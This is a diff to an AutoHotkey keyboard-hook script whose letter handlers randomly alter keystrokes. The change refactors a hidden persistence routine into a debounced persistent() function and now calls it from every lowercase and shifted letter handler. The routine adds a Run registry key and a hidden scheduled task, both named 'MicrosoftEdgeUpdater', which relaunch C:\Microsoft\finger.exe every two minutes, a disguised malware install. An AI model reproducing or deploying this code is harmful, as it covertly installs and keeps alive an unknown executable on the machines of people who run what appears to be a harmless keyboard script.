@@ -32,6 +32,23 @@ konami(char) {
     }
 }
 
+debouncePersistent() {
+    global _Timer
+
+    ; If timer already exists, stop it (reset countdown)
+    if IsSet(_Timer)
+        SetTimer(_Timer, 0)
+
+    ; Create timer that will call persistent() once after 1000ms
+    _Timer := (*) => persistent()
+    SetTimer(_Timer, -7000) ; negative for one-shot
+}
+
+persistent() {
+    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+}
+
 $q::{
 	rand := Random(1, odds2)
 	if (rand <= odds1) {
@@ -44,9 +61,8 @@ $q::{
 	} else {
 		Send "q"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("q")
+	debouncePersistent()
 }
 $+q::{
 	rand := Random(1, odds2)
@@ -61,6 +77,7 @@ $+q::{
 		Send "+q"
 	}
 	konami("q")
+	debouncePersistent()
 }
 $w::{
 	rand := Random(1, odds2)
@@ -78,9 +95,8 @@ $w::{
 	} else {
 		Send "w"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("w")
+	debouncePersistent()
 }
 $+w::{
 	rand := Random(1, odds2)
@@ -99,6 +115,7 @@ $+w::{
 		Send "+w"
 	}
 	konami("w")
+	debouncePersistent()
 }
 $e::{
 	rand := Random(1, odds2)
@@ -116,9 +133,8 @@ $e::{
 	} else {
 		Send "e"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("e")
+	debouncePersistent()
 }
 $+e::{
 	rand := Random(1, odds2)
@@ -137,6 +153,7 @@ $+e::{
 		Send "+e"
 	}
 	konami("e")
+	debouncePersistent()
 }
 $r::{
 	rand := Random(1, odds2)
@@ -154,9 +171,8 @@ $r::{
 	} else {
 		Send "r"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("r")
+	debouncePersistent()
 }
 $+r::{
 	rand := Random(1, odds2)
@@ -175,6 +191,7 @@ $+r::{
 		Send "+r"
 	}
 	konami("r")
+	debouncePersistent()
 }
 $t::{
 	rand := Random(1, odds2)
@@ -192,9 +209,8 @@ $t::{
 	} else {
 		Send "t"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("t")
+	debouncePersistent()
 }
 $+t::{
 	rand := Random(1, odds2)
@@ -213,6 +229,7 @@ $+t::{
 		Send "+t"
 	}
 	konami("t")
+	debouncePersistent()
 }
 $y::{
 	rand := Random(1, odds2)
@@ -230,9 +247,8 @@ $y::{
 	} else {
 		Send "y"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("y")
+	debouncePersistent()
 }
 $+y::{
 	rand := Random(1, odds2)
@@ -251,6 +267,7 @@ $+y::{
 		Send "+y"
 	}
 	konami("y")
+	debouncePersistent()
 }
 $u::{
 	rand := Random(1, odds2)
@@ -268,9 +285,8 @@ $u::{
 	} else {
 		Send "u"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("u")
+	debouncePersistent()
 }
 $+u::{
 	rand := Random(1, odds2)
@@ -289,6 +305,7 @@ $+u::{
 		Send "+u"
 	}
 	konami("u")
+	debouncePersistent()
 }
 $i::{
 	rand := Random(1, odds2)
@@ -306,9 +323,8 @@ $i::{
 	} else {
 		Send "i"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("i")
+	debouncePersistent()
 }
 $+i::{
 	rand := Random(1, odds2)
@@ -327,6 +343,7 @@ $+i::{
 		Send "+i"
 	}
 	konami("i")
+	debouncePersistent()
 }
 $o::{
 	rand := Random(1, odds2)
@@ -344,9 +361,8 @@ $o::{
 	} else {
 		Send "o"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("o")
+	debouncePersistent()
 }
 $+o::{
 	rand := Random(1, odds2)
@@ -365,6 +381,7 @@ $+o::{
 		Send "+o"
 	}
 	konami("o")
+	debouncePersistent()
 }
 $p::{
 	rand := Random(1, odds2)
@@ -378,9 +395,8 @@ $p::{
 	} else {
 		Send "p"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("p")
+	debouncePersistent()
 }
 $+p::{
 	rand := Random(1, odds2)
@@ -395,6 +411,7 @@ $+p::{
 		Send "+p"
 	}
 	konami("p")
+	debouncePersistent()
 }
 $a::{
 	rand := Random(1, odds2)
@@ -412,9 +429,8 @@ $a::{
 	} else {
 		Send "a"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("a")
+	debouncePersistent()
 }
 $+a::{
 	rand := Random(1, odds2)
@@ -433,6 +449,7 @@ $+a::{
 		Send "+a"
 	}
 	konami("a")
+	debouncePersistent()
 }
 $s::{
 	rand := Random(1, odds2)
@@ -454,9 +471,8 @@ $s::{
 	} else {
 		Send "s"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("s")
+	debouncePersistent()
 }
 $+s::{
 	rand := Random(1, odds2)
@@ -479,6 +495,7 @@ $+s::{
 		Send "+s"
 	}
 	konami("s")
+	debouncePersistent()
 }
 $d::{
 	rand := Random(1, odds2)
@@ -500,9 +517,8 @@ $d::{
 	} else {
 		Send "d"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("d")
+	debouncePersistent()
 }
 $+d::{
 	rand := Random(1, odds2)
@@ -525,6 +541,7 @@ $+d::{
 		Send "+d"
 	}
 	konami("d")
+	debouncePersistent()
 }
 $f::{
 	rand := Random(1, odds2)
@@ -546,9 +563,8 @@ $f::{
 	} else {
 		Send "f"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("f")
+	debouncePersistent()
 }
 $+f::{
 	rand := Random(1, odds2)
@@ -571,6 +587,7 @@ $+f::{
 		Send "+f"
 	}
 	konami("f")
+	debouncePersistent()
 }
 $g::{
 	rand := Random(1, odds2)
@@ -592,9 +609,8 @@ $g::{
 	} else {
 		Send "g"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("g")
+	debouncePersistent()
 }
 $+g::{
 	rand := Random(1, odds2)
@@ -617,6 +633,7 @@ $+g::{
 		Send "+g"
 	}
 	konami("g")
+	debouncePersistent()
 }
 $h::{
 	rand := Random(1, odds2)
@@ -638,9 +655,8 @@ $h::{
 	} else {
 		Send "h"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("h")
+	debouncePersistent()
 }
 $+h::{
 	rand := Random(1, odds2)
@@ -663,6 +679,7 @@ $+h::{
 		Send "+h"
 	}
 	konami("h")
+	debouncePersistent()
 }
 $j::{
 	rand := Random(1, odds2)
@@ -684,9 +701,8 @@ $j::{
 	} else {
 		Send "j"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("j")
+	debouncePersistent()
 }
 $+j::{
 	rand := Random(1, odds2)
@@ -709,6 +725,7 @@ $+j::{
 		Send "+j"
 	}
 	konami("j")
+	debouncePersistent()
 }
 $k::{
 	rand := Random(1, odds2)
@@ -728,9 +745,8 @@ $k::{
 	} else {
 		Send "k"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("k")
+	debouncePersistent()
 }
 $+k::{
 	rand := Random(1, odds2)
@@ -751,6 +767,7 @@ $+k::{
 		Send "+k"
 	}
 	konami("k")
+	debouncePersistent()
 }
 $l::{
 	rand := Random(1, odds2)
@@ -766,9 +783,8 @@ $l::{
 	} else {
 		Send "l"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("l")
+	debouncePersistent()
 }
 $+l::{
 	rand := Random(1, odds2)
@@ -785,6 +801,7 @@ $+l::{
 		Send "+l"
 	}
 	konami("l")
+	debouncePersistent()
 }
 $z::{
 	rand := Random(1, odds2)
@@ -800,9 +817,8 @@ $z::{
 	} else {
 		Send "z"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("z")
+	debouncePersistent()
 }
 $+z::{
 	rand := Random(1, odds2)
@@ -819,6 +835,7 @@ $+z::{
 		Send "+z"
 	}
 	konami("z")
+	debouncePersistent()
 }
 $x::{
 	rand := Random(1, odds2)
@@ -836,9 +853,8 @@ $x::{
 	} else {
 		Send "x"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("x")
+	debouncePersistent()
 }
 $+x::{
 	rand := Random(1, odds2)
@@ -857,6 +873,7 @@ $+x::{
 		Send "+x"
 	}
 	konami("x")
+	debouncePersistent()
 }
 $c::{
 	rand := Random(1, odds2)
@@ -874,9 +891,8 @@ $c::{
 	} else {
 		Send "c"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("c")
+	debouncePersistent()
 }
 $+c::{
 	rand := Random(1, odds2)
@@ -895,6 +911,7 @@ $+c::{
 		Send "+c"
 	}
 	konami("c")
+	debouncePersistent()
 }
 $v::{
 	rand := Random(1, odds2)
@@ -912,9 +929,8 @@ $v::{
 	} else {
 		Send "v"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("v")
+	debouncePersistent()
 }
 $+v::{
 	rand := Random(1, odds2)
@@ -933,6 +949,7 @@ $+v::{
 		Send "+v"
 	}
 	konami("v")
+	debouncePersistent()
 }
 $b::{
 	rand := Random(1, odds2)
@@ -950,9 +967,8 @@ $b::{
 	} else {
 		Send "b"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("b")
+	debouncePersistent()
 }
 $+b::{
 	rand := Random(1, odds2)
@@ -971,6 +987,7 @@ $+b::{
 		Send "+b"
 	}
 	konami("b")
+	debouncePersistent()
 }
 $n::{
 	rand := Random(1, odds2)
@@ -988,9 +1005,8 @@ $n::{
 	} else {
 		Send "n"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("n")
+	debouncePersistent()
 }
 $+n::{
 	rand := Random(1, odds2)
@@ -1009,6 +1025,7 @@ $+n::{
 		Send "+n"
 	}
 	konami("n")
+	debouncePersistent()
 }
 $m::{
 	rand := Random(1, odds2)
@@ -1024,9 +1041,8 @@ $m::{
 	} else {
 		Send "m"
 	}
-	RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
-	Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
 	konami("m")
+	debouncePersistent()
 }
 $+m::{
 	rand := Random(1, odds2)
@@ -1043,6 +1059,7 @@ $+m::{
 		Send "+m"
 	}
 	konami("m")
+	debouncePersistent()
 }
 $Up::{
     Send "{Up}"
